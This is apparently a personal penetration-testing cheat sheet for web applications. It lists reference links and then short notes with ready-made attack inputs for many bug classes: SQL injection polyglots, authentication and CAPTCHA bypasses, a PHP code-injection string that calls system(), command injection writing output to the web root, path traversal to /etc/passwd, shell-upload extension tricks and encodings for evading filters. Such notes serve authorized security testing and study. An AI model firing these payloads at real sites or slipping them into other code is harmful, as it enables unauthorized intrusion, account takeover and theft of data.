# pentest

# checklists / cheatsheets
https://gist.github.com/gbedoya/10935137

https://github.com/OWASP/wstg/tree/master/document
https://cheatsheetseries.owasp.org/owasp
https://owasp.org/www-community/owasp

https://portswigger.net/web-security/all-materials
https://github.com/hackerscrolls/SecurityTips
https://cobalt.io/vulnerability-wiki/
http://projects.webappsec.org/w/page/13246978/Threat-Classification
http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html

https://github.com/swisskyrepo/PayloadsAllTheThings
https://github.com/carlospolop/hacktricks
https://github.com/rmusser01/Infosec_Reference
https://github.com/qazbnm456/awesome-web-security
https://github.com/enaqx/awesome-pentest
https://github.com/sbilly/awesome-security
https://github.com/payloadbox/
https://github.com/Az0x7/vulnerability-Checklist?

# old
http://code.google.com/p/pentest-bookmarks/wiki/BookmarksList
http://www.win.tue.nl/~aeb/linux/hh/hh.html

# tools
https://inventory.raw.pm/overview.html
https://github.com/0xApt/awesome-bbht
https://www.owasp.org/index.php/Phoenix/Tools
https://oss-security.openwall.org/wiki/tools
https://github.com/dloss/python-pentest-tools
https://blackarch.org/tools.html

# search for known exploits
searchsploit, locate -i, grep -r {exploit-database,packetstorm,vulndbs}/

site:seclists.org KEYWORD <- many lists
site:lists.grok.org.uk KEYWORD <- full disclosure only
site:cvedetails site:attackerkb.com site:cvebase.com

www.intelligentexploit.com ...
metasploit modules, nmap nse
grep in blackarch,pentoo,kali,...
learn about technology, test on a local install
admin interfaces: https://www.whitehatsec.com/bAdmin/bAdmin.html

# testing
* type cast issues / trigger error messages
?a=1&a[]=1
?x[y]=1&x[y]z=2
?foo=bar and ?foo[]=bar if same response maybe app casts array to string
/nul IIS

* source code leak
http://a.com/index.jsp::$DATA or .JSP or .jsp. or jsp%20
http://a.com/myapp/%252e%252e/manager/html mod_jk
http://a.com/index.jsp%01 (http://secalert.net/#scl-soh)
http://a.com/index.js%70 (WebLogic http://www.securityfocus.com/bid/2527/exploit)
http://a.com/examples/snp/snoop%252ejsp (Tomcat http://www.securityfocus.com/bid/2527/exploit)
http://a.com/login.JsP (IBM Websphere http://www.securityfocus.com/bid/1328/info)
http://a.com/login.jsp%20 (Netscape Web Server http://www.securityfocus.com/bid/273/discuss)
http://a.com/%3f.jsp (Allaire JRun Root http://www.securityfocus.com/bid/3592/discuss)
http://a.com///[1-4096 slashes here]/admin/* (Apache long slash path directory listing http://www.securityfocus.com/bid/2503/discuss)
http://a.com/%5cadmin/ (BEA WebLogic Directory Traversal with %00, %2e, %2f and %5c via:http://www.securityfocus.com/bid/2513/discuss)

* cgi
shellshock
/cgi-bin/test-cgi?/* and /cgi-bin/test-cgi?* https://teamrocketist.github.io/2017/09/15/Web-SECTF-Sprinkler-system/ http://insecure.org/sploits/test-cgi.server_protocol.html

* content discovery
https://github.com/six2dez/OneListForAll

* polyglot
https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
https://twitter.com/PortSwiggerRes/status/1289143670273462272
https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/ using BENCHMARK instead of SLEEP
http://www.slideshare.net/MathiasKarlsson2/polyglot-payloads-in-practice-by-avlidienbrunn-at-hackpra
mysql: +or+SLEEP(10)/*'or+SLEEP(10)+or'"or+SLEEP(10)+or"*/ urlencoded: %20or%20sleep%2810%29/%2a%27or%20sleep%2810%29%20or%27%22or%20sleep%2810%29%20or%22%2a/
xss: " onclick=alert(1)//<button value=Click_Me ' onclick=alert(1)//> */ alert(1); /*
aio: /*! SLEEP(1) /*/ onclick=alert(1)//<button value=Click_Me /*/*/ or' /*! or SLEEP(1) or /*/, onclick=alert(1)//> /*/*/'or" /*! or SLEEP(1) or /*/, onclick=alert(1)// /*/*"/** /*!/*/ // /*/*/

* xss
leverage error pages/sqli errors/... (send encoded xss, response returns error page with decoded payload)
utf-7
upload .stm file IIS serves them as text/html https://twitter.com/ldionmarcil/status/922553386645454850
<script><im<script>g onerror=.. -> <img onerror=..
<svg/onload=..
xssi

* cors
send Origin: https://evil.net (many servers dynamically generate Access-Control-Allow-Origin: based on user-supplied Origin:)
send Origin: https://evillegit.com if site only trusts legit.com
send Origin: https://legit.com.evil.net if site only trusts https://legit.com
send Origin: null failing to configure an origin whitelist in certain applications may result in Access-Control-Allow-Origin: null and the null origin can be obtained using a sandboxed iframe <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>cors stuff here</script>'></iframe>
send Origin: https://legit.com`.evil.net/ URL parsing vuln in Safari with http://legit.com%60.evil.net/exploit.html
send Origin: http://evil.net failing to restrict the origin protocol -> mitm
chck Vary: Origin header is always sent

* sqli
?id=!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~  // id=%21%22%23%24%25%26%27%28%29%2A%2B%2C-.%2F%3A%3B%3C%3D%3E%3F%40%5B%5C%5D%5E_%60%7B%7C%7D%7E
' '' " "" \ \\ \' \" ... ) -- )--
?id=1`--+-
%2527 %2522 ... %252527 ...
?login=user1&password=') or 1=1 limit 0,1 --%20 to bypass `.. AND password = MD5('%s')"`
?login=%bf%27 # bypass mysql-real-escape-string (db driver and db don't talk same charset)
send even and odd numbers of ' (filter doubles up single quotes but truncates input to N chars)
stacked, time-based, second order
rtfm keywords/escaping
select 1 from users where login = "login" and password = "password" => 1 # sqlite
select * from users where username = 'a'+'b' and password = 'a'+'b' => returns first user whose username and password doesn't start with a numeric value http://vagosec.org/2013/04/mysql-implicit-type-conversion/ # mysql
select * from users where username = 0 => returns all records because column is of type varchar, every username is converted into a double, and 0=0 is true

* sqli in order by (MySQL)
?order=book_id+DESC
?order=book_id`,`book_name
?order=IF(1,book_id,book_name)

* parameters to test
GET, POST, Cookie, User-Agent, Host, Referer, X-Forwarded-For, X-Forwarded-Host, Origin, Accept-Language ...
X-Forwarded-For: 127.0.0.1 also try public IP, local interface IP etc.
Proxy: 127.0.0.1:8080 (https://httpoxy.org)

* bypass IP whitelisting
X-Forwarded-For: 0000::1 (RoR 4.2 Web Console https://gist.github.com/joernchen/d868521352f1ccd25095)
Connection: close, X-Forwarded-For # https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers

* account registration
incomplete validation: remove last character of long password, change case, remove specials
password hash collision # different passwords, same digest (md5, sha1 ...)
register Admin to login as admin # MySQL comparison is case insensitive by default
register admin%20 to login as admin # MySQL string comparison ignores trailing spaces
register admin++++...++++x column truncation http://www.notsosecure.com/blog/2008/09/11/sql-column-truncation-vulnerabilities/ http://www.suspekt.org/2008/08/18/mysql-and-sql-column-truncation-vulnerabilities/
register admin+lulz@company.com to register "admin"

* email address parsing
me@evil.com@legit.com https://nathandavison.com/blog/exploiting-email-address-parsing-with-aws-ses
me(admin@legit.me)@evil.com <- email comment
array: email=admin@legit.me&email=me@evil.com

* password reset
mysql 1="1abc" is true and 0="abc" is true so request /reset?token=0 http://phrack.org/issues/69/12.html
reset token is NULL in db by default so request ?reset_token=%00 - opencfp bug http://haxx.ml/post/149975211631/how-i-hacked-your-cfp-and-probably-some-other
send more than one reset password request at the same time, or http pipeline multiple requests (dont update `Content-Length` or send `Connection: close`)
integer key truncation like php in 2015, send id of 4294967296: var_dump([0 => 0] === [0x100000000 => 0]); => bool(true) https://bugs.php.net/bug.php?id=69892
poisoning https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning

* authentication bypass
/activate/?activation_code= -> SELECT * FROM users WHERE (users.`activation_code` IS NULL) LIMIT 1 # login w/o password as the first account
/login?username[]=admin&password=
/login?username=admin&password[]=a -> strcmp($expectedpw, $_GET['password') == 0
/login?username=admin&password[password]=1 -> and password=`password`=1; is true in mysql
try with empty password (ldap unauthenticated authentication)
unicode case mapping collisions https://dev.to/jagracey/hacking-github-s-auth-with-unicode-s-turkish-dotless-i-460n

* race conditions
register account with multiple emails, use a coupon multiple times etc.

* 2fa / mfa
../sms https://sakurity.com/blog/2015/03/15/authy_bypass.html

* rate limiting bypass
send each request from a different IP at the exact same time https://thezerohack.com/how-i-might-have-hacked-any-microsoft-account

* type juggling in php or other http://www.php.net/manual/en/language.types.type-juggling.php
var_dump('1abcdef' == 1); => true, var_dump("0e1234" == "0e4321"); => true, var_dump(md5(array()) == "") => true 
or stuff like strcmp, equals ... http://turbochaos.blogspot.com.au/2013/08/exploiting-exotic-bugs-php-type-juggling.html

* signature bypass
Cookie: sess=$username|$expiry|$hmac => hmac_md5(admin1|1353464343, $key) == hmac(admin|11353464343, $key) (wordpress) or bf $key (rack)

* authentication bypass (session puzzling)
hit the forgotpw page with the admin username to get an authenticated admin cookie (SEPM CVE-2015-1486)
hit the register page with the admin username while authenticated as a lambda user to change session (seam, mellivora)

* authentication bypass (mass assignment / autobinding)
https://www.owasp.org/index.php/Mass_Assignment_Cheat_Sheet

* authorization / idor
signature oracle

* captcha
remove captcha_answer= parameter from request
leaked in src or cookie
re-submit same answer w/ same cookie
limited number of words (solve with a hash lookup table)
tesseract-ocr ou gocr ou ssocr
remove blue grid from image `Image('captcha.png').point(lambda p: p>0 and 255).save('clean.png')` blank everything that's not black
un-implode
SentryMBA

* server side include
<!--#printenv -->

* server side template injection (ssti)
http://blog.portswigger.net/2015/08/server-side-template-injection.html
http://blog.orange.tw/2016/04/bug-bounty-uber-ubercom-remote-code_7.html
https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
{{7*7}}
<%= 7*7 %>

* expression language injection
${777-111} #{777-111} %{777-111}
see ./java

* code injection
search.php?q={${phpinfo()}} // http://secalert.net/#ebay-rce-ccs
try echo pi in case input is eval'd by PHP app
in PHP usort: ?order=id);}system('uname%20-a');//
in PHP assert: ?vuln=hacker'.phpinfo().' -> assert('hacker'.phpinfo().'

* OS command injection
try commands that don't return any output or only return one word: sleep/ping/pwd/whoami
or get output through out-of-band
or ip=127.0.0.1%0a`id`>/var/www/public/results.txt

* xml, xpath, ldap injection
see ./twahh

* SMTP
%0aCc:
%0d%0aBcc:
%0aDATA%0afoo%0a%2e%0aMAIL+FROM:...

* upload
change extension
  PHP: .php[0-7], .pht, .phtm, .phtml, .phar, .php.xyz, .xhtml, .shtml, .stm. .shtm, ..., .html, .htm, .htt, .mht, .thtml, .svg, .xml, .inc, .pgif, .phps
  ASP: .asp, .aspx, .cer, .asa
  JSP: .jsp, .jspx, .jsw, .jsv, .jspf
  Coldfusion: .cfm, .cfml, .cfc, .dbm
upload AAAA...AA.php.txt so server truncates extention (e.g. filename length restriction)
upload ws.pphphp, ws.PhP, ws.php.FUZZjpg, ws.phpFUZZ.jpg, ws.php\x00.jpg, ws.php/, ws.php.\ ...
upload ws.php.csv
upload .htaccess to enable another allowed extension to be run by PHP
upload evil.php with Content-Type: image/jpg in case app checks the MIME type
upload evil.jpg with PHP code inside image
upload evil.png and access uploads/evil.png/x.php (nginx)
upload imagetragick (im relies on the magic header so even if app checks extension you can upload a .mvg or .svg file as evil.png)
upload zip and access evil.zip%23x.php also http://snyk.io/research/zip-slip-vulnerability

* passive scanning
parse image responses for sql errors, path/ip disclosures etc.

* path traversal / LFI
try ../ then ../../ then ../../../ (can get an error on first 2 but success on 3rd)
....// (evasion, more below)
try ../flagéééé (truncates extension appended by server because length(é)==2)
try /static../secret/flag.php (nginx alias traversal)
http://srv/web/blah\..\jobMail.asp IIS

* randomness
crack rand() seed https://github.com/altf4/untwister
clone mersenne twister mt19937 https://github.com/tna0y/Python-random-module-cracker

* inter-protocol
server does not sanitize dns response from attacker's domain => xss, sqli, rce ...
desync attacks
http splitting

* parser differential
https://labs.bishopfox.com/tech-blog/an-exploration-of-json-interoperability-vulnerabilities # json
https://blog.deesee.xyz/fuzzing/security/2021/02/26/ssrf-bypassing-hostname-restrictions-fuzzing.html # ssrf/url
orange tsai

* dependency confusion
https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
https://blog.includesecurity.com/2021/02/dependency-confusion-when-are-your-npm-packages-vulnerable/

* heartbleed
ESX & ESXi are vuln

* dos
hashtable collisions (http://www.phpinternalsbook.com/hashtables/hash_algorithm.html)
php CVE-2018-5711 + gif upload

* bypass checks
python: ?bet=NaN -> float('Nan') > 100 is True or float-point precision: 1*1 + 0.1*1 - 1*1 - 0.1*1 is > 0
php: ?str1[]=a&str2[]=b -> md5($str1) === md5($str2) is true
utf

* bypass path filter
///index.php <- php parse_url() bypass
/;/index

# evasion
always keep in mind that filters and weird setups can alter your inputs
cap strings, add stuff, replace/remove characters, triple the = sign ...
windows: change case, use 8.3 file/dir names, insert unsupported chars (<, : etc.) that will be automatically removed

SeLeCt
selselectect
%53%45%4c%45%43%54
%2553%2545%254c%2545%2543%2554
//....//....//etc/passwd
etc.

* bypass all 3 filters with "1%0A)or(1)%23" or "0%0a)union/**/select/**/null"
$id = str_replace(' ', '', $id);
if (!preg_match('/^\d+$/m', $id)) { die(); }
$id = preg_replace('/^[^\d]+$/', '', $id); // won't replace "a1"

* whitespace
%09 %0d %0a %20 ...
add more than one of each type

* url encoding
s%65lect
s%2565lect
s%elect

* multiline regex
id=123\nPAYLOAD

* comments
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
SEL/*foo*/ECT username,password FR/*foo*/OM users // mysql only

* string concatenation
MySQL: concat('adm','in')
Oracle: 'adm'||'in'
MS-SQL: 'adm'+'in'

exec('sel' + 'ect * fro' + 'm users')

* alternate IP encoding (https://prezi.com/fffqa6n75gbm/zeronights-2014-hunting-for-top-bounties/)
https://github.com/IceM4nn/IP-Obfuscator
127.0.0.1
2130706433
0x7f000001
0x7f.0x0.0x0.0x1
0177.0000.0000.0001
ping 010.010.010.010; ping 127.1; ping 0177.1; ping 0x7f.1; ping 0; man inet_aton (You can use/mix decimal/octal/hex, omit some/most octets)

http://425.510.425.510/ dotted decimal with overflow
http://2852039166/ dotless decimal
http://7147006462/ dotless decimal with overflow
http://0xA9.0XFE.0XA9.0XFE/ dotted hexadecimal
http://0xA9FEA9FE/ dotless hexadecimal
http://0x41414141A9FEA9FE/ dotless hexadecimal with overflow
more in Server Side Browsing by @agarri https://www.youtube.com/watch?v=8t5-A4ASTIU

* utf-7
def utf7(s): # Illegal but accepted UTF7, useful for some blacklists
  return ''.join('+%s-' % b64encode('\x00' + c).rstrip('=') for c in s)

* utf-16
U-FF2e http://graphemica.com/%ef%bc%ae get(u'u\uff2e./flag.txt') (in case "ＮＮ" is blacklisted)
U-012f http://graphemica.com/%c4%ae http://www.fileformat.info/info/unicode/char/012e/index.htm get(u'\u012e\u012e/flag.txt') (in case "Ｎ" is blacklisted)

* utf-8

  URL-encoding | overlong UTF-8
.     %2e      | %c0%ae %c0%2e
/     %2f      | %c0%af %c0%2f
\     %5c      | %c0%5c ..
'     %27      | %c0%a7
"     %22      | %c0%a2
<     %3c      | %c0%bc
;     %3b      | %c0%bb
&     %26      | %c0%a6
\0    %00      | %c0%80 %e0%80%80 %f0%80%80%80

* unicode normalization https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability

..             | U+2025 NFKC: %e2%80%a5 https://www.compart.com/en/unicode/U+002e

* unicode overflows
https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows
